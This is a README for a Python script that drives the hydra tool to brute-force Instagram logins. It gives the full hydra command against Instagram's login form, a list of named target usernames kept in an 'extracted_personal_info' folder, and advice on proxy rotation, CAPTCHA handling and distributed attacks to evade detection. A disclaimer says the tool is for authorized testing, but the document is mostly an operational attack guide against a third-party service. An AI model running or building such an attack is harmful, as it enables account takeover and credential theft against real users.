# Real Hydra Instagram Brute Force Tool

## Overview

This is a **real, operational** Python script that executes the actual `hydra` binary for Instagram brute force attacks. This tool is designed for authorized penetration testing and security research.

## ⚠️ IMPORTANT DISCLAIMER

This tool is for **authorized penetration testing only**. Only use this against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal charges.

## Features

- **Real Hydra Execution**: Actually calls the `hydra` binary via subprocess
- **Instagram Target**: Specifically configured for Instagram login attacks
- **Proxy Support**: HTTP and SOCKS5 proxy support
- **Real-time Output**: Live Hydra output monitoring
- **Session Management**: Automatic saving of successful logins
- **Comprehensive Logging**: Detailed logs for forensic analysis
- **Rich Console Interface**: Beautiful terminal output with progress tracking

## Prerequisites

### System Requirements
- Linux environment (tested on Ubuntu/Debian)
- Python 3.8+
- Hydra 9.0+ installed

### Install Hydra
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install hydra

# Verify installation
hydra -V
```

### Python Dependencies
```bash
pip install rich
```

## File Structure

```
├── real_hydra_brute_force.py          # Main executable script
├── run_real_hydra_examples.sh         # Usage examples
├── extracted_personal_info/
│   └── target_usernames.txt           # Target usernames (required)
├── wordlists/
│   └── combined_passlist.txt          # Password dictionary (required)
├── proxy_list.txt                     # Proxy list (optional)
├── sessions/
│   └── valid_sessions.json            # Successful logins output
└── logs/
    ├── hydra_brute_force.log          # Application logs
    └── hydra_brute_force.log.hydra    # Raw Hydra output
```

## Usage

### Basic Attack
```bash
python real_hydra_brute_force.py --verbose
```

### Attack Through Proxy
```bash
# HTTP Proxy
python real_hydra_brute_force.py --proxy http://127.0.0.1:8080 --verbose

# SOCKS5 Proxy
python real_hydra_brute_force.py --proxy socks5://127.0.0.1:1080
```

### Limited Attempts
```bash
python real_hydra_brute_force.py --max-attempts 100 --verbose
```

### All Options
```bash
python real_hydra_brute_force.py --help
```

## Configuration

### Target Usernames
Edit `extracted_personal_info/target_usernames.txt`:
```
alx.trading
whatilove1728
alexander.fleming
fleming654
```

### Password Dictionary
The script uses `wordlists/combined_passlist.txt`. This should contain common passwords, variations, and target-specific passwords.

### Proxy Configuration
Optional `proxy_list.txt` for rotating proxies:
```
http://proxy1.example.com:8080
http://proxy2.example.com:8080
socks5://proxy3.example.com:1080
```

## How It Works

1. **Loads Configuration**: Reads usernames and passwords from files
2. **Builds Hydra Command**: Constructs actual hydra command with proper parameters
3. **Executes Hydra**: Uses subprocess to run hydra binary
4. **Monitors Output**: Real-time parsing of hydra output
5. **Saves Results**: Automatically saves successful logins to JSON
6. **Logs Everything**: Comprehensive logging for analysis

## Actual Hydra Command

The script builds and executes commands like:
```bash
hydra -L extracted_personal_info/target_usernames.txt \
      -P wordlists/combined_passlist.txt \
      -t 4 -w 3 -o logs/hydra_brute_force.log.hydra \
      -f -V www.instagram.com \
      https-post-form \
      "/accounts/login/:username=^USER^&password=^PASS^:Please wait a few minutes before trying again"
```

## Output Files

### Successful Logins (`sessions/valid_sessions.json`)
```json
{
  "timestamp": "2025-06-12T10:30:45.123456",
  "username": "target_user",
  "password": "found_password",
  "target": "www.instagram.com",
  "method": "hydra",
  "hydra_output": "...",
  "proxy_used": "http://proxy:8080"
}
```

### Application Logs (`logs/hydra_brute_force.log`)
```
[2025-06-12 10:30:45] [INFO] Executing Hydra command: hydra -L ...
[2025-06-12 10:30:46] [INFO] Hydra completed with return code: 0
[2025-06-12 10:30:46] [SUCCESS] SUCCESSFUL LOGIN: username:password
```

## Security Considerations

### Rate Limiting
- Instagram implements aggressive rate limiting
- Use delays between attempts
- Rotate proxies to avoid detection
- Consider distributed attacks

### Detection Avoidance
- Use residential proxies
- Randomize user agents
- Implement CAPTCHA handling
- Monitor for account lockouts

### Legal Compliance
- Only test authorized targets
- Maintain detailed logs
- Follow responsible disclosure
- Respect scope limitations

## Troubleshooting

### Hydra Not Found
```bash
# Install Hydra
sudo apt-get install hydra

# Verify installation
which hydra
hydra -V
```

### Permission Denied
```bash
# Make script executable
chmod +x real_hydra_brute_force.py

# Run with proper permissions
sudo python real_hydra_brute_force.py
```

### Network Issues
- Check proxy connectivity
- Verify target accessibility
- Monitor rate limiting responses
- Check firewall rules

### File Not Found Errors
- Ensure all required files exist
- Check file permissions
- Verify file paths in configuration

## Advanced Usage

### Custom Hydra Parameters
Modify the `execute_hydra()` method to customize:
- Thread count (`-t`)
- Wait time (`-w`)
- Timeout values
- Output formats
- Additional modules

### Integration with Other Tools
- Chain with reconnaissance tools
- Integrate with proxy rotators
- Connect to notification systems
- Export to penetration testing frameworks

## Performance Tuning

### Threading
- Default: 4 threads (`HYDRA_THREADS = 4`)
- Increase for faster attacks (risk: higher detection)
- Decrease for stealth (slower but less detectable)

### Timeouts
- Connection timeout: 30 seconds
- Overall timeout: 30 minutes
- Adjust based on network conditions

### Memory Usage
- Large password lists may require more RAM
- Consider splitting large wordlists
- Monitor system resources

## Contributing

1. Fork the repository
2. Create feature branch
3. Add tests for new functionality
4. Submit pull request
5. Follow security guidelines

## License

This tool is provided for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations.

## Support

For issues, questions, or feature requests:
1. Check existing documentation
2. Review troubleshooting section
3. Create detailed issue reports
4. Provide relevant log files

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
